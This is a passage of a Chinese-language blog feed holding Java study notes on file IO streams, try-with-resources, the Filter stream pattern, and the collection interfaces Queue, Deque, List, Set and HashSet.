<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">File <span class="keyword">static</span> <span class="title">createTempFile</span><span class="params">(prefix,suffix,[File])</span> </span></span><br></pre></td></tr></table></figure>
<p>可选参数 File ，为是否改变默认的保存地址为 File 的地址（需要传入的 File 实例是一个文件夹，然后临时文件创建到这个文件夹中）。</p>
<h3 id="文件夹操作"><a href="#文件夹操作" class="headerlink" title="文件夹操作"></a>文件夹操作</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">mkdir</span><span class="params">()</span> <span class="comment">//创建文件夹，必须前面路径的文件夹存在才能创建成功。</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">mkdirs</span><span class="params">()</span> <span class="comment">//创建全路径文件夹，若前面路径不存在则自动创建。</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">delete</span><span class="params">()</span> <span class="comment">// 文件夹目录为空才能删除。</span></span></span><br></pre></td></tr></table></figure>
<h2 id="字节-IO-流"><a href="#字节-IO-流" class="headerlink" title="字节 IO 流"></a>字节 IO 流</h2><h3 id="try-resource-catch-语句"><a href="#try-resource-catch-语句" class="headerlink" title="try(resource)-catch 语句"></a>try(resource)-catch 语句</h3><p>InputStrean 和 OutputStream 这种流 IO 在运行的时候会占用各种资源，所以在结束流之后关闭流来释放资源是很有必要的。但是对于这种操作，往往可能关闭的不太顺利，可能出现流正在被使用无法关闭的情景，所以 <code>try-catch</code> 语句也就常常伴随着 close() 的调用而出现，来解决流关闭失败后的处理。</p>
<p>但是用一次 close() 就写一个  <code>try-catch</code> 有点麻烦了，Java 就给了一个小语法糖：<code>try(resource)-catch</code> 语句。这个语句和 <code>try-catch</code> 的区别就是对于在<code>(resource)</code> 这里开启的资源，结束运行之后，会自动调用资源的 close() 方法。因此能使用 <code>try(resource)-catch</code> 的语句必须拥有 close() 方法，也就是实现 closeable 接口。</p>
<p>正巧 IOStream 都实现了这个接口，就可以使用上面的语句是申请 IO 流资源而不用写关闭代码，因为编译器会自动帮忙写，所以也是一个语法糖。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>(<span class="keyword">new</span> InputStream(File)) &#123;</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">&#125; <span class="comment">// 结束运行之后会自动调用 close() 来关闭流</span></span><br></pre></td></tr></table></figure>
<p>看源代码发现，这个 InputStream 和 OutputStream 抽象类实现了 Closeable 接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">InputStream</span> <span class="keyword">implements</span> <span class="title">Closeable</span></span></span><br></pre></td></tr></table></figure>
<p>而这个 Colseable 接口只有一个方法，就是 close() 方法， 也是我们对 IOStream 类操作的时候，最后需要释放资源时使用的 close() 方法。只要这个类实现了 Closeable 接口，那么就可以应用在 <code>try(resource)-catch</code> 语句里面，运行结束之后自动关闭流。</p>
<h3 id="InputStream：FileInputStream"><a href="#InputStream：FileInputStream" class="headerlink" title="InputStream：FileInputStream"></a>InputStream：FileInputStream</h3><p>对于从文件中读取，使用 InputStream 的子类 FileInputStream，在构造方法传入 File 实例或者一个文件路径的字符串。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(String name)</span> <span class="comment">//自己根据路径找文件</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(File file)</span> <span class="comment">//借助File实例找文件</span></span></span><br></pre></td></tr></table></figure>
<p>确认文件之后就可以使用内置的 read() 方法读取文件内容了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="comment">//一次读取一个字节</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">byte</span> b[])</span> <span class="comment">//一次读取b数组大小的字节</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">byte</span> b[], <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span> <span class="comment">//off是指读取的内容写入b数组中的起始位置，len表示写入的字节长度</span></span></span><br></pre></td></tr></table></figure>
<h3 id="OutputStream：FileOutputStram"><a href="#OutputStream：FileOutputStram" class="headerlink" title="OutputStream：FileOutputStram"></a>OutputStream：FileOutputStram</h3><p>对于向文件写入，使用 OutputStream 的子类 FileOutputStream，在构造方法传入 File 实例或者一个文件路径的字符串。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileOutputStream</span><span class="params">(String name)</span> <span class="comment">//传入文件路径覆盖写入</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileOutputStream</span><span class="params">(String name, <span class="keyword">boolean</span> append)</span> <span class="comment">//append为true时往文件末尾写入</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileOutputStream</span><span class="params">(File file)</span> <span class="comment">//传入File实例获取路径</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileOutputStream</span><span class="params">(File file, <span class="keyword">boolean</span> append)</span> <span class="comment">//append为true时往文件末尾写入</span></span></span><br></pre></td></tr></table></figure>
<p>确认文件之后就可以使用内置的 write() 方法向文件中写入内容了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> b)</span> <span class="comment">//读取一个字节</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span> b[])</span> <span class="comment">//读取一个字节数组</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span> b[], <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span> <span class="comment">//设置写入文件的数据中，在b数组的起始位置off以及总长度len</span></span></span><br></pre></td></tr></table></figure>
<p>在 Java 中为了效率，有了输入输出的缓冲区，只有缓冲区内数据到达一定程度，才会真正的写入到文件中，但是有些情况我们需要即使写入，那么就可以调用 flush() 来将缓冲区的数据直接写入到文件中。</p>
<h3 id="Filter-设计模式"><a href="#Filter-设计模式" class="headerlink" title="Filter 设计模式"></a>Filter 设计模式</h3><p>因为对于 IO 的输入输出来说，有的时候我们想要在输入输出的同时添加一些额外的工作，比如加密，解码等等。在通常情况下，解决方法就是单独写一个类继承于 IOStream 然后添加新功能，但当各种小功能需要排列组合使用的时候，就会引起功能类数量爆炸的情况，所以这里引入了 Filter 的设计模式，来对功能类进行排列组合。</p>
<p>首先要实现的功能需要继承于 FilterInputStream/FilterOutputStream ，然后功能类的构造方法参数为 IOStream 并用 super() 传给 Filter 类的构造方法，最后就可以重写 read() 和 write() 方法，使用原输入输出就用 in.read() 或者 out.write() ，只需要前后添加新功能即可，类似于普通代理。</p>
<p>有了功能类之后，就可以利用在构造方法中不停套娃其他的功能类，实现功能的排列组合，一个简单的对输出数据进心 base64 加密的功能类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FilterOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        File file=<span class="keyword">new</span> File(<span class="string">&quot;Xorex.Tempest&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>(Base64OutputString BaseOut=<span class="keyword">new</span> Base64OutputString(<span class="keyword">new</span> FileOutputStream(file))) &#123; </span><br><span class="line">            BaseOut.write(<span class="string">&quot;I like coding!&quot;</span>.getBytes());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">//<span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base64OutputString</span> <span class="keyword">extends</span> <span class="title">FilterOutputStream</span> </span>&#123;</span><br><span class="line">    Base64OutputString(OutputStream out) &#123;</span><br><span class="line">        <span class="keyword">super</span>(out);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span>[] b)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.write(Base64.getEncoder().encode(b));       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Filter 父类里面的构造方法其实就是将传入的输入流实例赋值给 in 或者 out，然后这个可以被子类重写方法的时候调用，从而实现功能的组合。</p>
<p>剩下的东西不太想写了，鸽了。以后直接上传思维导图好了。</p>
<p>主要 IO 框架的思维导图：</p>
<iframe src="https://www.xmind.net/embed/kSC5hQ" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<p>IO 相关类的继承关系的思维导图：</p>
<iframe src="https://www.xmind.net/embed/wLEzaX" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>笔记</tag>
        <tag>IO</tag>
      </tags>
  </entry>
  <entry>
    <title>Java集合学习笔记【二】</title>
    <url>/2021/02/21/3fb2b83273fd/</url>
    <content><![CDATA[<h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><p>因为这个和 IO 的流输入流输出有关，所以日后再来补坑。</p>
<h2 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h2><p>首先来看看 Queue 接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">Collection</span>&lt;<span class="title">E</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里可以看到是和 List 同级别的接口，都继承了 collection，顾名思义啊，这个 Queue 就是一个实现了队列功能的集合，First In First Out 先进先出。</p>
<p>而在 Java 中，实现 Queue 接口的类是：LinkedList，虽说它叫作  LinkedList ，但是它实际上是实现了 List 和 Queue 两个接口。我们可以向上转型为 Queue，然后把它当作队列的实例使用。</p>
<p>看一看 Queue 里面封装的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span></span>; <span class="comment">//向队列尾部加入元素</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e)</span></span>; <span class="comment">//向队列尾部加入元素</span></span><br><span class="line"><span class="function">E <span class="title">remove</span><span class="params">()</span></span>; <span class="comment">//返回队头元素，并删除</span></span><br><span class="line"><span class="function">E <span class="title">poll</span><span class="params">()</span></span>; <span class="comment">//返回队头元素，并删除</span></span><br><span class="line"><span class="function">E <span class="title">element</span><span class="params">()</span></span>; <span class="comment">//返回队头元素，但不删除</span></span><br><span class="line"><span class="function">E <span class="title">peek</span><span class="params">()</span></span>; <span class="comment">//返回队头元素，但不删除</span></span><br></pre></td></tr></table></figure>
<p>上面相同的功能有两种不同的方法实现，一个是常用词（add，remove，element），另一个是非常用词（offer，poll，peek），两者的区别就是前者出错时直接抛出异常，后者时返回 null。</p>
<h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>优先队列，在 Java 中使用堆结构实现。为 PriorityQueue 类，并实现了 Queue 接口。其所拥有的的方法和 Queue 差不多，唯一的不同是队列开头的元素是按照自己要求排出来的第一。</p>
<p>因为涉及到了比较，所以和 TreeMap 以及 Collections.sort() 一样，要么在元素的类中实现 Comparable 接口中的 compareTo() 方法，要么在建立 PriorityQueue 实例的时候传入一个 Comparator 的匿名类进去。</p>
<h2 id="Deque"><a href="#Deque" class="headerlink" title="Deque"></a>Deque</h2><p>Deuqe 是个双端队列，双端队列故名思意就是可以在队列头和队列尾都添加元素的队列，同样是实现了FIFO先进先出的特性。ArrayDeque 和 LinkedList 两者实现了 Deque 接口（好家伙 LinkedList 也太全能了吧），而 Deque 接口规定了必须要实现的方法：</p>
<table>
<thead>
<tr>
<th align="left">功能</th>
<th align="left">Deque</th>
</tr>
</thead>
<tbody><tr>
<td align="left">添加元素到队尾</td>
<td align="left">addLast(E e) / offerLast(E e)</td>
</tr>
<tr>
<td align="left">取队首元素并删除</td>
<td align="left">E removeFirst() / E pollFirst()</td>
</tr>
<tr>
<td align="left">取队首元素但不删除</td>
<td align="left">E getFirst() / E peekFirst()</td>
</tr>
<tr>
<td align="left">添加元素到队首</td>
<td align="left">addFirst(E e) / offerFirst(E e)</td>
</tr>
<tr>
<td align="left">取队尾元素并删除</td>
<td align="left">E removeLast() / E pollLast()</td>
</tr>
<tr>
<td align="left">取队尾元素但不删除</td>
<td align="left">E getLast() / E peekLast()</td>
</tr>
</tbody></table>
<p>用法和优先队列的 Queue 完全相同，而且 Deque 也是继承于 Queue 接口的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Deque</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>所以 Deque 也可以使用 offer() 添加元素到队尾，但是并不推荐这样写，对于这种双端队列，还是写成 offerLast() 这样更明确一些。</p>
<p>因为像 LinkedList 这样实现了很多不同接口的类，我们具体要把它当作某一个接口使用的时候，因该让它向上转型为对应的接口，然后按照接口拥有的功能进行操作，这种尽量持有接口的方法才是面向对象的思想。</p>
<h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><p>众所周知，栈是一个先进后出的数据结构，和叠碗筷差不多。在 Java 中并没有单独搞一个叫作 Stack 的接口，这是因为历史遗留问题，有一个单独叫作 Stack 的类，因为这个 Stack 类所拓展的 Vector 类是一个早期 Java 写的一个不太行的类，里面很多方法都是线程安全的，速度很慢，所以就直接废弃不用了。</p>
<p>那如何实现栈结构呢？当然是使用万能的双端队列 Deque 啦，Deque 接口就封装了栈所需要的一些方法，如：</p>
<ul>
<li>把元素压入栈中： push(E)/addFirst(E)</li>
<li>把元素弹出栈：pop(E)/removeFirst(E)</li>
<li>取栈顶元素但不弹出： peek(E)/peekFirst(E)</li>
</ul>
<p>如果将 Deque 当作 Stack 使用的时候，尽量用 push pop peek 这样的方法，更直接清晰。</p>
<p>栈数据结构的用途非常多，以后会慢慢学的。</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>集合</tag>
      </tags>
  </entry>
  <entry>
    <title>Java集合学习笔记【一】</title>
    <url>/2021/02/21/ea646ab3cd00/</url>
    <content><![CDATA[<h2 id="集合导论"><a href="#集合导论" class="headerlink" title="集合导论"></a>集合导论</h2><p>集合 Collection</p>
<p>用来存储数据使用，对应着不同类型的需求，拥有着不同的集合来处理它。Collection 是一个顶层接口，下面继承他的还有两个接口，分别是 List 接口和 Set 接口，其中 List 接口实现的是有序可重复的列表，Set 接口实现的是无序不可重复的列表。剩下的就是实现 List 和 Set 接口的各种类了，这些类五花八门，可以根据需要选择使用。</p>
<p><img src="https://xorex.space/image/156.png" alt="img"></p>
<h2 id="Collection-接口"><a href="#Collection-接口" class="headerlink" title="Collection 接口"></a>Collection 接口</h2><h3 id="Collection-的定义"><a href="#Collection-的定义" class="headerlink" title="Collection 的定义"></a>Collection 的定义</h3><p>首先我们看 Collection 接口的定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Collection</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">Iterable</span>&lt;<span class="title">E</span>&gt; </span></span><br></pre></td></tr></table></figure>
<p>继承了一个 Iterable 的接口，并使用了泛型，泛型用于定义此集合存储的数据类型，而继承的接口 Iterable 可以先不管，一会再看它。接口里面定义了所有实现这个接口的类所必须要有的方法，因为 Collection 接口是所有集合都要实现的接口，因此所有的集合都有 Collection  接口里面的方法，下面是一些主要的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>; <span class="comment">// 返回集合元素数量</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>; <span class="comment">// 返回集合是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span></span>; <span class="comment">// 返回是否包含某个元素</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span></span>; <span class="comment">// 加入某个元素并返回是否加入成功</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span></span>; <span class="comment">// 删除某个元素并判断是否删除成功</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>; <span class="comment">// 删除所有的元素</span></span><br><span class="line"><span class="function">Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span></span>; <span class="comment">// 返回此集合的一个迭代器</span></span><br></pre></td></tr></table></figure>
<p>研究 Collection 接口里面的方法是因为这些方法在所有集合里面都是通用的，无论我们拿到一个什么样的集合，都可以使用 Collection 接口里面定义的方法来对此集合进行操作，而 Collection 接口的存在，除了方便规定集合以外，还可以用来玩多态，无论是啥集合，统一向上转型，然后当作 Collection 实例处理。</p>
<h3 id="Iterator-迭代器"><a href="#Iterator-迭代器" class="headerlink" title="Iterator 迭代器"></a>Iterator 迭代器</h3><p>仔细观察 Collection 接口的主要方法，里面是没有用来返回元素的，这是因为有些集合，是没有索引的，比如 <code>set</code> 接口下面实现的几种集合。他们不能通过对下标的遍历来遍历整个集合。面对千万种不同的集合，一种统一的用于集合的迭代接口就必不可少了，把具体的迭代细节封装起来，留下统一的方法接口，只管调用即可。</p>
<p>而 Iteratior 接口就是这种标准的迭代接口，在 Collection 接口种就规定了一个方法用来返回用于此集合遍历的迭代器 <code>Iterator&lt;E&gt; iterator();</code>。而 Iteratior 接口规定了实现迭代统一而必不可少的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>; <span class="comment">// 返回是否还有下一个元素</span></span><br><span class="line">    <span class="function">E <span class="title">next</span><span class="params">()</span></span>; <span class="comment">// 返回下一个元素并移动指针指向</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没错，只有这两个方法就够了，判断还有下一个元素没有了，如果有就取出来，如果没有那就迭代完成！我们不需要关心集合是啥，只要 hasNext 和 next ，闭着眼都能遍历它。</p>
<h3 id="增强-For-循环"><a href="#增强-For-循环" class="headerlink" title="增强 For 循环"></a>增强 For 循环</h3><p>对于数组和集合来说，可以使用普通 for 循环和迭代器来迭代它，首先建立一个集合并添加元素：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; Tempest=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">Tempest.add(<span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">Tempest.add(<span class="string">&quot;Asuna&quot;</span>);</span><br><span class="line">Tempest.add(<span class="string">&quot;Yukino&quot;</span>);</span><br><span class="line">Tempest.add(<span class="string">&quot;Megumi&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>然后对集合进行遍历：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(Iterator&lt;String&gt; Ti =Tempest.iterator();Ti.hasNext();) &#123;</span><br><span class="line">    String i=Ti.next();</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是利用了普通 for 循环和迭代器实现了集合的遍历。</p>
<p>那么这样的写法一般是比较固定的，于是 Java 就加入了一个语法糖，增强 for 循环。使用格式就是 <code>for(集合元素类型 变量名 : 集合实例名);</code> ，然后遍历代码就可以简化如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(String i:Tempest) &#123;</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本质上还是用了迭代器，只不过这部分代码是编译器帮助我们生成的，我们只写语法糖部分即可。</p>
<h2 id="List-接口及其实现"><a href="#List-接口及其实现" class="headerlink" title="List 接口及其实现"></a>List 接口及其实现</h2><h3 id="List-接口"><a href="#List-接口" class="headerlink" title="List 接口"></a>List 接口</h3><p>上面说了 Collection 接口被 List 和 Set 两个接口继承，从而将集合分为了两大结构，这里我们就开始讨论一下这个 List 接口，以及 List 接口的一些实现。首先我们看一下官方给 List 的介绍：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">* An ordered collection (also known as a &lt;i&gt;sequence&lt;/i&gt;).  The user of this</span><br><span class="line">* interface has precise control over where in the list each element is</span><br><span class="line">* inserted.  The user can access elements by their integer index (position in</span><br><span class="line">* the list), and search for elements in the list.&lt;p&gt;</span><br></pre></td></tr></table></figure>
<p>首先 List 是一个 ordered collection 即<strong>有序列表</strong>，这意味着元素的取出顺序和放入顺序是相同的。并且可以 precise control over where 精确的控制元素的插入位置，使用元素 integer index <strong>坐标</strong>来访问和搜索。</p>
<p>然后我们来看看 List 区别与 Collection 的主要方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>; <span class="comment">// 获取在某坐标的元素</span></span><br><span class="line"><span class="function">E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span></span>; <span class="comment">// 在某坐标替换元素（删除原元素），并返回原元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span></span>;<span class="comment">// 在某坐标插入元素，原元素后移一位</span></span><br><span class="line"><span class="function">E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>; <span class="comment">// 移除某坐标的元素</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span></span>;<span class="comment">// 获取某元素第一次出现的坐标值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lastIndexOf</span><span class="params">(Object o)</span></span>;<span class="comment">// 获取某元素最后一次出现的坐标值</span></span><br></pre></td></tr></table></figure>
<p>不同的地方自然是有序列表和坐标的引入了，那么就会有上面针对于坐标的操作。</p>
<h3 id="List-和-Array-互换"><a href="#List-和-Array-互换" class="headerlink" title="List 和 Array 互换"></a>List 和 Array 互换</h3><p>第一种是从 List 转换为 Array，方法自然是使用 List 接口里面的 <code>toArray(T[])</code> 传入一个和元素类型相同的数组，然后返回一个将 List 元素转化过的数组。当然如果我们传入的数组大小和 List 元素数量不一样的话，它也会自动处理的，小的话它会新建一个刚刚好的数组复制之后返回回来，大的话它会把没有容纳 List 元素的位置填成 null。当然我们可以直接写个大小刚刚好的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] array = Tempest.toArray(<span class="keyword">new</span> String[Tempest.size()]);</span><br></pre></td></tr></table></figure>
<h3 id="ArrayList-集合"><a href="#ArrayList-集合" class="headerlink" title="ArrayList 集合"></a>ArrayList 集合</h3><p>ArrayList 是对 List 接口的一个实现类，而它的实现方法是使用数组，数组的缺点就是在插入元素的时候，后面的元素都要全部后移，造成了性能消耗比较大：</p>
<table>
<thead>
<tr>
<th align="left">执行请求</th>
<th align="left">资源消耗</th>
</tr>
</thead>
<tbody><tr>
<td align="left">获取指定元素</td>
<td align="left">速度很快</td>
</tr>
<tr>
<td align="left">添加元素到末尾</td>
<td align="left">速度很快</td>
</tr>
<tr>
<td align="left">在指定位置添加/删除</td>
<td align="left">需要移动元素</td>
</tr>
<tr>
<td align="left">内存占用</td>
<td align="left">少</td>
</tr>
</tbody></table>
<h3 id="LinkedList-集合"><a href="#LinkedList-集合" class="headerlink" title="LinkedList 集合"></a>LinkedList 集合</h3><p>LinkedList 也同样是对 List 接口的一个实现类，而它的实现方法是使用链表，链表的缺点就是查询的时候，需要遍历一边链表才能查到，造成了性能消耗比较大：</p>
<table>
<thead>
<tr>
<th align="left">执行请求</th>
<th align="left">资源消耗</th>
</tr>
</thead>
<tbody><tr>
<td align="left">获取指定元素</td>
<td align="left">需要从头开始查找元素</td>
</tr>
<tr>
<td align="left">添加元素到末尾</td>
<td align="left">速度很快</td>
</tr>
<tr>
<td align="left">在指定位置添加/删除</td>
<td align="left">不需要移动元素</td>
</tr>
<tr>
<td align="left">内存占用</td>
<td align="left">较大</td>
</tr>
</tbody></table>
<h2 id="Set-接口及其实现"><a href="#Set-接口及其实现" class="headerlink" title="Set 接口及其实现"></a>Set 接口及其实现</h2><h3 id="Set-接口"><a href="#Set-接口" class="headerlink" title="Set 接口"></a>Set 接口</h3><p>讨论完 List 接口之后来看看 Set 接口，同样作为继承于 Collection 的好孩子，Set 接口有什么特点呢，看看官方文档吧：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">* A collection that contains no duplicate elements.  More formally, sets</span><br><span class="line">* contain no pair of elements &#123;@code e1&#125; and &#123;@code e2&#125; such that</span><br><span class="line">* &#123;@code e1.equals(e2)&#125;, and at most one null element.  As implied by</span><br><span class="line">* its name, this interface models the mathematical &lt;i&gt;set&lt;/i&gt; abstraction.</span><br></pre></td></tr></table></figure>
<p>no duplicate elements 表示 Set 里面<strong>没有重复</strong>的元素，也就是两个 equals() 能判断相等的两个元素，null 也只能有一个。并且此集合没有索引，也就不存在了各种有关索引操作的方法了。</p>
<p>至于这个接口规定的一些方法，其实没啥好讲的，和 Collection 差不多，下面直接研究实现 Set 接口的两个重要的类，分别是 HashSet 和 LinkedHashSet 。</p>
<h3 id="HashSet-集合"><a href="#HashSet-集合" class="headerlink" title="HashSet 集合"></a>HashSet 集合</h3><h4 id="HashSet内部实现"><a href="#HashSet内部实现" class="headerlink" title="HashSet内部实现"></a>HashSet内部实现</h4><p>HashSet 是 Set 的一个实现类，故名思意，实现 Set 的方法就是用了 Hash，确切的说，使用了 Hash 实现的 Map，即 HashMap。这可是个好东西，通过 Map 构建了键值对映射之后，就意味着我们对于 List 的查询和添加效率不可得兼的问题就得到了解决。使用 HashMap 可以高效的完成添加和查询，但是牺牲就是里面无法存储重复的元素。</p>
<p>这里对上面的名词进行解释一下， Hash，哈希表，又叫做散列表，是用来计算唯一特征值的一种算法，每一个实例都可以计算出来自己独一无二的 Hash 值，我们将这个 Hash 值作为键，将实例作为值，然后用 Map 结构来存储两者，通过 Map 结构可以用 Hash 值作为键值快速获得实例。</p>
<p>因此我们总结出来了，使用 HashSet 有两个必须要的条件：</p>
<ol>
<li>可以计算一个实例的 Hash 值，并且尽可能地独一无二。</li>
<li>拥有判断两个实例是否相等地算法，保证集合元素不会重复。</li>
</ol>
<p>第一个在 Java 里面，需要自己在写类的时候就重写继承于 Object 的方法 hashCode()，第二个则需要重写 Object 的 equals() 方法。</p>
<h4 id="重写-hashCode"><a href="#重写-hashCode" class="headerlink" title="重写 hashCode()"></a>重写 hashCode()</h4><p>首先我们看看 Object 里面的 hashCode() 是怎么写的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>使用了 native 关键词，说明是调用了系统来返回一个十进制整数，作为这个实例的 Hash 值。</p>
<p>而我们的重写就需要自己计算 Hash 值了，这个算法需要保证两点</p>
<ul>
<li>如果两个对象相等，则两个对象的<code>hashCode()</code>必须相等；</li>
<li>如果两个对象不相等，则两个对象的<code>hashCode()</code>尽量不要相等。</li>
</ul>
<p>Java 为我们提供了一个利器来实现 Hash 的计算，因为不同的实例本质上是字段的值不同，所以我们就根据字段来计算 Hash 值，而计算的方法则是利用 Objects.hash()，它使用是可变参数，往里面把所有的字段都填进去即可返回一个合适的 Hash 值。</p>
